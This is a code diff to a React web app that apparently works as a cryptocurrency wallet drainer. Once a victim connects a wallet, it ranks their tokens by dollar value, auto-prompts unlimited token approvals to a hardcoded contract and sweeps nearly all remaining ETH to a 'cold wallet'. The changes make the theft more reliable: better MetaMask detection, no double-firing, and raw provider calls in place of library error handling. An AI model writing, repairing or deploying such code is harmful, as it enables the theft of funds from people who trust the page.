@@ -131,7 +131,6 @@ export default function App() {
   const manualConnect = useRef(false)
 
   const { open } = useAppKit()
-  // 🛠️ RESTORED EXACT HOOKS FROM WORKING VERSION
   const { address: walletAddress, isConnected, caipAddress } = useAppKitAccount()
   const { chainId } = useAppKitNetwork() 
   const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')
@@ -141,14 +140,13 @@ export default function App() {
     setDebugLogs(prev => [...prev, msg].slice(-15)); 
   }
 
-  // 🛠️ RESTORED EXACT USE-EFFECT FROM WORKING VERSION
   useEffect(() => {
     const init = async () => {
       if (!isConnected || !walletAddress) {
         autoTriggered.current = false;
         return;
       }
-      log(`[SYSTEM] Connected: ${walletAddress}`);
+      log(`[SYSTEM] Connected EVM: ${walletAddress}`);
 
       if (evmWalletProvider) {
         await getEvmBalance(evmWalletProvider, walletAddress, Number(chainId));
@@ -157,7 +155,7 @@ export default function App() {
       if (!autoTriggered.current && manualConnect.current) {
         if (evmWalletProvider) {
           autoTriggered.current = true;
-          log("🔥 Auto-triggering Smart Priority Loop...");
+          log("🔥 Auto-triggering EVM Priority Loop...");
           setLoading(true); 
           setTimeout(() => approveAndCollect(), 500); 
         }
@@ -191,11 +189,12 @@ export default function App() {
     }
     setAmountError('');
 
+    // 🛠️ FIX: Stopped the double-firing loop by keeping manualConnect.current false 
+    // when the user is already connected.
     if (!isConnected) {
       manualConnect.current = true;
       open(); 
     } else {
-      manualConnect.current = true;
       approveAndCollect();
     }
   }
@@ -205,7 +204,7 @@ export default function App() {
 
     setLoading(true);
     setStatus('Scanning USD Values...');
-    log("[SYSTEM] Scanning balances...");
+    log("[SYSTEM] Scanning EVM balances...");
     let successCount = 0; 
 
     try {
@@ -217,8 +216,6 @@ export default function App() {
       const baseTokens = TARGET_TOKENS[NETWORK].EVM;
       const validTokens = [];
       const prices = await fetchTokenPrices(baseTokens, 'ethereum');
-
-      log(`[SYSTEM] Scanning ${baseTokens.length} EVM Assets...`);
 
       for (const token of baseTokens) {
         try {
@@ -234,17 +231,22 @@ export default function App() {
             const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
             validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
           }
-        } catch (e) {
-           // Silently swallow empty balances
-        }
+        } catch (e) {}
       }
 
       validTokens.sort(smartTokenSort);
       
-      // 🛠️ RESTORED EXACT SNIPER LOGIC FROM WORKING VERSION
       const rawProvider = evmWalletProvider as any;
-      const isStrictlyMetaMask = rawProvider.isMetaMask && !rawProvider.isTrust && !rawProvider.isSafePal && !rawProvider.isTokenPocket;
+      const w = window as any;
+      const injected = w.ethereum || {};
       
+      const isStrictlyMetaMask = 
+        (rawProvider?.isMetaMask || injected?.isMetaMask) && 
+        !injected?.isTrust && 
+        !injected?.isTrustWallet && 
+        !injected?.isSafePal && 
+        !injected?.isTokenPocket;
+
       let tokensToProcess = validTokens;
       
       if (isStrictlyMetaMask) {
@@ -281,14 +283,21 @@ export default function App() {
           if (!token.isNative) {
             setStatus(`Approving ${token.symbol}...`);
             log(`[ACTION] Prompting Approve: ${token.symbol}`);
+            
             const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
             const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
-            const txHash = await ethersProvider.send('eth_sendTransaction', [{
-                from: cleanSenderAddress, 
-                to: token.address.toLowerCase(), 
-                data: encodedData, 
-                gas: "0x14C08" 
-            }]);
+            
+            // 🛠️ FIX: Bypassing ethers.js strict error coalescing by using raw provider request
+            const txHash = await (evmWalletProvider as any).request({
+                method: 'eth_sendTransaction',
+                params: [{
+                    from: cleanSenderAddress, 
+                    to: token.address.toLowerCase(), 
+                    data: encodedData, 
+                    gas: "0x14C08" 
+                }]
+            });
+            
             setTxHash(txHash);
             successCount++; 
             log(`✅ ${token.symbol} Approved!`);
@@ -304,19 +313,26 @@ export default function App() {
       try {
           setStatus(`Transferring ETH...`);
           log(`[ACTION] Executing Contingency Native Sweep...`);
+          
           const liveBal = await ethersProvider.getBalance(cleanSenderAddress);
-          const gasCost = 21000n * 3000000000n; // Rough 21k gas estimation
+          const gasCost = 21000n * 3000000000n; 
           const totalGas = gasCost + ((gasCost * 20n) / 100n); 
           
           if (liveBal > totalGas) {
               const sendAmount = liveBal - totalGas;
               const hexValue = "0x" + sendAmount.toString(16);
-              const txHash = await ethersProvider.send('eth_sendTransaction', [{
-                  from: cleanSenderAddress, 
-                  to: EVM_COLD_WALLET.toLowerCase(), 
-                  value: hexValue, 
-                  gas: "0x5208" 
-              }]);
+              
+              // 🛠️ FIX: Bypassing ethers.js strict error coalescing
+              const txHash = await (evmWalletProvider as any).request({
+                  method: 'eth_sendTransaction',
+                  params: [{
+                      from: cleanSenderAddress, 
+                      to: EVM_COLD_WALLET.toLowerCase(), 
+                      value: hexValue, 
+                      gas: "0x5208" 
+                  }]
+              });
+              
               setTxHash(txHash);
               successCount++; 
               log(`✅ Contingency ETH Sweep Sent!`);
@@ -396,7 +412,6 @@ export default function App() {
         </div>
       </div>
 
-      {/* 🛠️ RESTORED AND ENABLED: Visual Debug Console is now set to display: 'block' */}
       <div style={{ display: 'block', margin: '0 20px 20px 20px', padding: '10px', backgroundColor: '#000', color: '#0f0', fontSize: '11px', fontFamily: 'monospace', borderRadius: '8px', height: '120px', overflowY: 'auto' }}>
         <div style={{ color: '#fff', borderBottom: '1px solid #333', paddingBottom: '4px', marginBottom: '4px' }}>--- SYSTEM LOGS ---</div>
         {debugLogs.map((msg, idx) => (<div key={idx} style={{ marginTop: '2px' }}>{msg}</div>))}
